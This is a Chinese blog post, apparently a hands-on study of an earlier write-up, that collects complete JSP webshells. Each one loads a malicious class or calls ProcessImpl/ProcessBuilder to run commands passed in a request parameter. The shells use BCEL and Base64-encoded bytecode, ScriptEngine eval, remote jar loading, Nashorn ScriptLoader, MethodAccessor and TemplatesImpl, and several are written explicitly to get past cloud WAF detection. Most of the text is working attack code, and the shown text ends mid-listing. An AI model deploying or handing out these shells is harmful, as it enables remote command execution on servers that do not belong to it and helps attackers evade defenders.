# JSP Webshell-类加载篇

起因：知识星球看了一篇ppt感觉很有意思。网上搜搜发现[三梦师傅20年](https://xz.aliyun.com/t/7798)就写过相关文章。

本文就是简单的手动实操一遍 理解其中原理。

首先编写JSPWebshell分为两步：1、编写恶意类 2、jsp中如何实例化类

恶意类：

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Evil {
    String s;
    public Evil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        String line;
        while((line=bufferedReader.readLine())!=null){
            stringBuilder.append(line).append("\n");
        }
         s = stringBuilder.toString();
    }
    public String toString(){
        return  s;
    }
}
```

## 使用BCEL字节码的JSP Webshell

### jsp

```jsp
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<html>
<body>
<h2>BCEL字节码的JSP Webshell</h2>
<%
    String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$dbR$TA$Q$3d$93$cbN$b2$y$84$84$40$88x$c3$L$84p$89$e2$N$D$a2$82$mhH$90$mV$k7$9b$B$Xs$abdC$f1G$bej$95$s$96T$f9$e8$83$7f$e2$3fXb$cf$s$QR$84$f2azv$ba$cf$f4$9c$3e$db3$bf$fe$7e$ff$B$e0$3e$de$aa$f0c$96$e3$9e$K$HfU$f2$3c$90$e6$a1$8aG$98$e3x$ac$82$p$ce1$af$c2$8b$Fi$9eH$e0$a2$HO$e5$fc$cc$8b$7e$3c$e7X$e2Xf$60U$86$40b_$3f$d0cy$bd$b8$XK$5b$V$b3$b87$cf$a0$y$98E$d3Zd$Y$8c$9c$PO$ec0$b8$96K9$c1$e0K$98E$91$ac$V$b2$a2$b2$adg$f3B$a6$x$Zz$7eG$af$98r$ddr$ba$ac$f7$s$j$a5$qV$O$cc$3c$a5w$g$85$iCo$d5$ce$b7T3$f39Qa$I$9f$3b$aa$V$a2$j$3df$b1$5c$b3$c8$x$f4$C$b1j$o$cdRl$bd$ed$s$94$ff$MjK$e8v$d6$91n$d8f$90v$f4ek$bb$bb$a2$or$t$f0$e1S$f8RG$84$b0$ae$3c$VK$b4$d3$96n$7c$d8$d0$cbvq$b6$94$_$e8wp$ac$90$fa$q$3c$83$barh$88$b2e$96$8aU$8eU$G$8fUj$d6$c3$Q$8cLt$d3$5bM$97j$VC$ac$9aR$z$afTiF$a24$E$f1$92$nt$81$$$ik$g$d6$f1J$c3k$q864$q$91$o$j$_$yX$e6$dbd$Y$ea$5e$a2$8c$be$d1$b0$85$98$864$b6$a9$3dT$N3r$V$c0$A$95$_i1$f4$b7$c9$a4$b2$fb$c2$b0$3a$5c$tu$Ot$e1p$d6$9b$3a$95$88$ba$n$o$3b$ca$dfN$b2U$xZf$81$94P$f7$84u$ba$Y$ec$90$ae$e5$96$bfE$i$K$83a$bc$5b$a7$9eqmVJ$86$a8V$e7$3bNj9$a9$P$e8$a4$O$aa$a1$93$d3$ce5$d9p$a4k$40$d60$d0$O$b5$baFz$3d$U$cf$r$ec$deQ$f4rY$U$a9$f7$a7$ff$c3$b6$b3$ff1J$b7$d6O$d7$9f$d1$a0$9fA$d6A$dfA$M$d2$3cD$ab$3fp$d2$b5$HR$d1$G$d8$R$i$99$G$9c$h$df$e0$9a$ac$c3$5d$87$92$3c$C$cfL7$e0$89$bb$8e$e0$cd$84$5d$N$a8qw$98B$3d$99$b8$f2$T$81$a9$b0R$87$W$e8$r$f3$ee$e3$f1$ef$e8T$j$7d_$e1$fbL$v$9d$I$91$j$a3$87$E$f0$c0E$b3$G$95$7c$3dDJ$c3$U$fa$e8$dd$f1a$95$e8$r$89$da0$a1$d6$9aT$Q$c6$r$c0$fe$g$n$ca$8c$d0$cb$b8$8c$xD9$849$5c$c55$ca$3dJ$Nv$9d$ac$8b2$dd$c4$N$gnz$ccFp$8bv$u$b8M$bbG$e18$a6$a0$c21$c61$ce$R$e1$98$e0$88rL$ca$b2$c3$e4$a3$u$u$B$89J$83$fa$95$ac$d4D$ceR$_w$f4$L$7c$9fl$c9d$r$8a$ed$M$daL$b5$s$a0$c5$94$e1$8e$8d$ba$fb$P$d6$853$Ul$F$A$A";
    response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("xsw6")).toString()).getBytes());
%>
</body>
</html>
```

理解很容易：

response.getOutputStream().write()：输出执行结果后的命令

String.valueOf():调用toString
原因三梦师傅也说了。(然后三梦师傅还列举了许多其他的方法...目前还并没有接触到)emmm只接触了抛出异常处理。
还有抛异常处理:
![image-20221114170325620](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211141703814.png)

## 使用自定义类加载器的JSP Webshell

主要是重写Classloader中的loadClass。

```java
<%@ page import="java.security.PermissionCollection" %>
<%@ page import="java.security.Permissions" %>
<%@ page import="java.security.AllPermission" %>
<%@ page import="java.security.ProtectionDomain" %>
<%@ page import="java.security.CodeSource" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.util.Base64" %>
<html>
<body>
<h2>自定义类加载器的JSP Webshell</h2>
<%
    response.getOutputStream().write(new ClassLoader() {

        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if (name.contains("Evil")) {
                return findClass(name);
            }
            return super.loadClass(name);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAVQoAEQAyBwAzCgACADIKADQANQoANAA2CgA3ADgHADkKAAcAOgcAOwoACQA8CgAJAD0KAAIAPggAPwoAAgBACQAQAEEHAEIHAEMBAAFzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMRXZpbDsBAANjbWQBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQARaW5wdXRTdHJlYW1SZWFkZXIBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwBCBwBEBwAzBwBFBwA5BwA7AQAKRXhjZXB0aW9ucwcARgEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAUAEcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcASAwASQBKDABLAEwHAE0MAE4ATwEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMABQAUAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMABQAUQwAUgAvDABTAFQBAAEKDAAuAC8MABIAEwEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAAPwAAwAHAAAATyq3AAG7AAJZtwADTbgABCu2AAW2AAZOuwAHWS23AAg6BLsACVkZBLcACjoFGQW2AAtZOgbGABIsGQa2AAwSDbYADFen/+kqLLYADrUAD7EAAAADABcAAAAmAAkAAAAIAAQACQAMAAoAFwALACEADAAsAA4ANwAPAEYAEQBOABQAGAAAAEgABwAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAXADgAHgAfAAMAIQAuACAAIQAEACwAIwAiACMABQA0ABsAJAATAAYAJQAAACEAAv8ALAAGBwAmBwAnBwAoBwApBwAqBwArAAD8ABkHACcALAAAAAQAAQAtAAEALgAvAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFgAYAAAADAABAAAABQAZABoAAAABADAAAAACADE=");
                return this.defineClass(name, bytes, 0, bytes.length);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    }.loadClass("Evil").getConstructor(String.class).newInstance(request.getParameter("xsw6")).toString().getBytes());
%>
</body>
</html>
```

## 使用ScriptEngine.eval的JSP Webshell

```java
<%--<%@ page import="javax.script.ScriptEngineManager" %>--%>
<%--<%@ page import="java.util.Base64" %>--%>
<%--<%@ page import="java.io.InputStream" %>--%>
<%--<%@ page import="java.io.BufferedReader" %>--%>
<%--<%@ page import="java.io.InputStreamReader" %>--%>
<%--<%@ page import="java.nio.charset.StandardCharsets" %>--%>
<%--<html>--%>
<%--<body>--%>
<%--<h2>ScriptEngine.eval的JSP Webshell</h2>--%>
<%--<%--%>
<%--  Runtime.getRuntime().exec("calc");--%>
<%--  String s = new String(Base64.getDecoder().decode("UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigieHN3NiIpKTs="));--%>
<%--  Process process = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s);--%>
<%--  StringBuilder stringBuilder = new StringBuilder();--%>
<%--  InputStream inputStream = process.getInputStream();--%>
<%--  InputStreamReader inputStreamReader = new InputStreamReader(inputStream);--%>
<%--  BufferedReader bufferedReader = new BufferedReader(inputStreamReader);--%>
<%--  String line;--%>
<%--  while((line=bufferedReader.readLine())!=null){--%>
<%--    stringBuilder.append(line).append("\n");--%>
<%--  }--%>
<%--  String s1 = stringBuilder.toString();--%>
<%--  response.getOutputStream().write(s1.getBytes(StandardCharsets.UTF_8));--%>

<%--%>--%>
<%--</body>--%>
<%--</html>--%>

<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>ScriptEngine.eval的JSP Webshell</h2>
<%
  String s = request.getParameter("threedr3am");
  String s1 = new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMo"));
  String s3 = new String(Base64.getDecoder().decode("KQ=="));
  String code = s1 +"'"+ s +"'"+s3+";";
  Process process = (Process) new ScriptEngineManager().getEngineByName("js").eval(code);
  InputStream inputStream = process.getInputStream();
  StringBuilder stringBuilder = new StringBuilder();
  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
  String line;
  while((line = bufferedReader.readLine()) != null) {
    stringBuilder.append(line).append("\n");
  }
  if (stringBuilder.length() > 0) {
    response.getOutputStream().write(stringBuilder.toString().getBytes());
  }
%>
</body>
</html>
```

## 使用URLClassLoader加载远程jar的JSP Webshell

```java
<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<html>
<body>
<h2>URLClassLoader加载远程jar的JSP Webshell</h2>
<%
    response.getOutputStream().write(new URLClassLoader(new URL[]{new URL("http://127.0.0.1:80/xs.jar")}).loadClass("Evil").getConstructor(String.class).newInstance(String.valueOf(request.getParameter("xsw6"))).toString().getBytes());
%>
</body>
</html>
```

## 使用javac动态编译class的JSP Webshell

这个只是看了一下代码。个人感觉这种一般斗绕过不了waf检测（我是觉得恶意代码太多了？但是可以编码...）。三梦师傅也说了相关原因。

## 使用了jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell

```java
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.security.CodeSource" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.util.Base64" %>
<%@ page import="jdk.nashorn.internal.runtime.Context" %>
<%@ page import="jdk.nashorn.internal.runtime.options.Options" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<html>
<body>
<h2>jdk.nashorn.internal.runtime.ScriptLoader类加载器加载的JSP Webshell</h2>
<%
    Class c = Class.forName("jdk.nashorn.internal.runtime.ScriptLoader");
    final Constructor constructor = c.getDeclaredConstructor(Context.class);
    constructor.setAccessible(true);
    final Method m = c.getDeclaredMethod("installClass", String.class, byte[].class, CodeSource.class);
    m.setAccessible(true);
    class A {
        B b;
        final class B {
            private Object o;
            private Object[] oo;

            public B() throws IllegalAccessException, InvocationTargetException, InstantiationException {
                o = constructor.newInstance(new Context(new Options(""), null, null));
                oo = new Object[]{"Evil", Base64.getDecoder().decode("yv66vgAAADQAVQoAEQAyBwAzCgACADIKADQANQoANAA2CgA3ADgHADkKAAcAOgcAOwoACQA8CgAJAD0KAAIAPggAPwoAAgBACQAQAEEHAEIHAEMBAAFzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMRXZpbDsBAANjbWQBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQARaW5wdXRTdHJlYW1SZWFkZXIBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwBCBwBEBwAzBwBFBwA5BwA7AQAKRXhjZXB0aW9ucwcARgEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAUAEcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcASAwASQBKDABLAEwHAE0MAE4ATwEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMABQAUAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIMABQAUQwAUgAvDABTAFQBAAEKDAAuAC8MABIAEwEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwAhABAAEQAAAAEAAAASABMAAAACAAEAFAAVAAIAFgAAAPwAAwAHAAAATyq3AAG7AAJZtwADTbgABCu2AAW2AAZOuwAHWS23AAg6BLsACVkZBLcACjoFGQW2AAtZOgbGABIsGQa2AAwSDbYADFen/+kqLLYADrUAD7EAAAADABcAAAAmAAkAAAAIAAQACQAMAAoAFwALACEADAAsAA4ANwAPAEYAEQBOABQAGAAAAEgABwAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAXADgAHgAfAAMAIQAuACAAIQAEACwAIwAiACMABQA0ABsAJAATAAYAJQAAACEAAv8ALAAGBwAmBwAnBwAoBwApBwAqBwArAAD8ABkHACcALAAAAAQAAQAtAAEALgAvAAEAFgAAAC8AAQABAAAABSq0AA+wAAAAAgAXAAAABgABAAAAFgAYAAAADAABAAAABQAZABoAAAABADAAAAACADE="), new CodeSource(null, (Certificate[]) null)};
            }
        }

        public A() throws IllegalAccessException, InstantiationException, InvocationTargetException {
            b = new B();
        }

        public Class invokex(Method method)
                throws InvocationTargetException, IllegalAccessException {
            return (Class) MethodUtil.invoke(method, b.o, b.oo);
        }
    }

    Class target = new A().invokex(m);
    response.getOutputStream().write(target.getConstructor(String.class).newInstance(request.getParameter("threedr3am")).toString().getBytes());
%>
</body>
</html>
```

三梦师傅这里找到了一个新的可以加载类的地方。

## 使用内部类绕某云检测java.lang.ProcessImpl以及invoke的一个JSP Webshell

```java
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<html>
<body>
<h2>java.lang.ProcessImpl JSP Webshell</h2>
<%
    try {
        final String s = request.getParameter("threedr3am");
        class A {

            B b;

            final class B {

                private Method o;
                private Object oo;
                private Object[] ooo;

                public B() throws ClassNotFoundException, NoSuchMethodException {
                    Class clz = Class.forName("java.lang.ProcessImpl");
                    Method method = clz
                            .getDeclaredMethod("start", String[].class, Map.class, String.class,
                                    ProcessBuilder.Redirect[].class, boolean.class);
                    method.setAccessible(true);
                    o = method;
                    oo = clz;
                    ooo = new Object[]{s.split(" "), null, null, null, false};
                }
            }

            public A() throws ClassNotFoundException, NoSuchMethodException {
                b = new B();
            }

            public Object invokex()
                    throws InvocationTargetException, IllegalAccessException {
                return MethodUtil.invoke(b.o, b.oo, b.ooo);
            }
        }

        Process process = (Process) new A().invokex();
        InputStream inputStream = process.getInputStream();
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        if (stringBuilder.length() > 0) {
            response.getOutputStream().write(stringBuilder.toString().getBytes());
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>
```

## 使用内部类绕某云检测java.lang.ProcessBuilder以及invoke的JSP Webshell

```java
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>java.lang.ProcessBuilder JSP Webshell</h2>
<%
    try {
        final String cmd = request.getParameter("threedr3am");
        class Threedr3am_8 {
            Threedr3amX threedr3amX;
            class Threedr3amX {
                private Process process;
                public Threedr3amX() throws IOException {
                    process = new ProcessBuilder().command(cmd.split(" ")).start();
                }
            }
            public Threedr3am_8() throws IOException {
                threedr3amX = new Threedr3amX();
            }
            public String echo() throws IOException {
                Process process = threedr3amX.process;
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line).append("\n");
                }
                return stringBuilder.toString();
            }
        }
        response.getOutputStream().write(new Threedr3am_8().echo().getBytes());
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>
```

## 利用MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell

这里三梦师傅代码写的有问题！

```java
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="sun.reflect.ReflectionFactory" %>
<%@ page import="java.security.AccessController" %>
<%@ page import="sun.reflect.MethodAccessor" %>
<html>
<body>
<h2>MethodAccessor.invoke绕过检测Method.invoke的JSP Webshell</h2>

<%
  Class<?> aClass = Class.forName("java.lang.ProcessImpl");
  String s = request.getParameter("threedr3am");
  Object[] s1 = {s.split(" "), null, null, null, false};
  Method method = aClass.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
  method.setAccessible(true);
  ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());
  MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);
  Process process = (Process) methodAccessor.invoke(aClass,s1);
  InputStream inputStream = process.getInputStream();
  StringBuilder stringBuilder = new StringBuilder();
  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
  String line;
  while ((line = bufferedReader.readLine()) != null) {
    stringBuilder.append(line).append("\n");
  }
  if (stringBuilder.length() > 0) {
    response.getOutputStream().write(stringBuilder.toString().getBytes());
  }
%>
</body>
</html>
```

## 使用了SPI机制的ScriptEngineManager自动加载实例化JSP Webshell



## 利用TemplatesImpl触发的JSP Webshell

```java
<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %>
<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileInputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="sun.misc.IOUtils" %>
<%@ page import="sun.reflect.misc.FieldUtil" %>
<html>
<body>
<h2>利用TemplatesImpl触发的JSP Webshell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
    String outputFile = tmp + File.separator + "jfkdjkadnkladmknjknfkjnadkad.txt";
    String s = request.getParameter("threedr3am");
    if (Files.exists(Paths.get(inputFile)))
        Files.delete(Paths.get(inputFile));
    Files.write(Paths.get(inputFile), s.getBytes());

    TemplatesImpl t = new TemplatesImpl();
    Field field = FieldUtil.getDeclaredFields(t.getClass())[4];
    byte[][] bytes = new byte[1][];
    bytes[0] = Base64.getDecoder().decode("yv66vgAAADQAjwoAJgA5CAA6CgA7ADwHAD0KAAQAOQoABAA+CQA/AEAIAEEKAAQAQggAQwoARABFBwBGCgBHAEgKAEkASgoADABLCABMCABNCgAMAE4IAE8KAAwAUAoARABRCgBSAFMHAFQHAFUKABgAVgoAFwBXCgAXAFgIAFkHAFoKAEkAWwoASQBcCgAMAF0HAF4KAEkAXwcAYAoAIwBhBwBiBwBjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAGIHAEYHAGQHAD0HAFQHAGABAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwBlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABJUaHJlZWRyM2FtXzExLmphdmEMACcAKAEADmphdmEuaW8udG1wZGlyBwBmDABnAGgBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAaQBqBwBrDABsAG0BAANjbWQMAG4AbwEABnJlc3VsdAcAcAwAcQByAQAQamF2YS9sYW5nL1N0cmluZwcAcwwAdAB1BwB2DAB3AHgMACcAeQEAASUBAAAMAHoAewEAASAMAHwAfQwAfgB/BwCADACBAIIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJwCDDAAnAIQMAIUAbwEAAQoBABhqYXZhL25pby9maWxlL0xpbmtPcHRpb24MAIYAhwwAiACJDACKAIsBABhqYXZhL25pby9maWxlL09wZW5PcHRpb24MAIwAjQEAE2phdmEvbGFuZy9UaHJvd2FibGUMAI4AKAEADVRocmVlZHIzYW1fMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAxyZWFkQWxsQnl0ZXMBABgoTGphdmEvbmlvL2ZpbGUvUGF0aDspW0IBAAUoW0IpVgEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZleGlzdHMBADIoTGphdmEvbmlvL2ZpbGUvUGF0aDtbTGphdmEvbmlvL2ZpbGUvTGlua09wdGlvbjspWgEABmRlbGV0ZQEAFyhMamF2YS9uaW8vZmlsZS9QYXRoOylWAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFd3JpdGUBAEcoTGphdmEvbmlvL2ZpbGUvUGF0aDtbQltMamF2YS9uaW8vZmlsZS9PcGVuT3B0aW9uOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAD3ByaW50U3RhY2tUcmFjZQAhACUAJgAAAAAAAwABACcAKAABACkAAAFwAAUACAAAANsqtwABEgK4AANMuwAEWbcABSu2AAayAAe2AAYSCLYABrYACU27AARZtwAFK7YABrIAB7YABhIKtgAGtgAJTrgAC7sADFksA70ADLgADbgADrcADxIQEhG2ABISE7YAFLYAFbYAFjoEuwAEWbcABToFuwAXWbsAGFkZBLcAGbcAGjoGGQa2ABtZOgfGABMZBRkHtgAGEhy2AAZXp//oLQO9AAy4AA0DvQAduAAemQAOLQO9AAy4AA24AB8tA70ADLgADRkFtgAJtgAgA70AIbgAIlenAAhMK7YAJLEAAQAEANIA1QAjAAIAKgAAAEIAEAAAABIABAAUAAoAFQAkABYAPgAYAGcAGQBwABoAggAcAI0AHQCdAB8ArwAgALoAIQDSACQA1QAiANYAIwDaACUAKwAAADMABf8AggAHBwAsBwAtBwAtBwAtBwAuBwAvBwAwAAD8ABoHAC0c/wAaAAEHACwAAQcAMQQAAQAyADMAAgApAAAAGQAAAAMAAAABsQAAAAEAKgAAAAYAAQAAACoANAAAAAQAAQA1AAEAMgA2AAIAKQAAABkAAAAEAAAAAbEAAAABACoAAAAGAAEAAAAwADQAAAAEAAEANQABADcAAAACADg=");
    field.setAccessible(true);
    field.set(t, bytes);

    Field field2 = FieldUtil.getDeclaredFields(t.getClass())[12];
    field2.setAccessible(true);
    field2.set(t, TransformerFactoryImpl.newInstance());

    Field field3 = FieldUtil.getDeclaredFields(t.getClass())[3];
    field3.setAccessible(true);
    field3.set(t, "threedr3am");

    Field field4 = FieldUtil.getDeclaredFields(t.getClass())[7];
    field4.setAccessible(true);
    field4.set(t, new HashMap<>());

    try {
        t.getOutputProperties();
    } catch (Exception e) {}

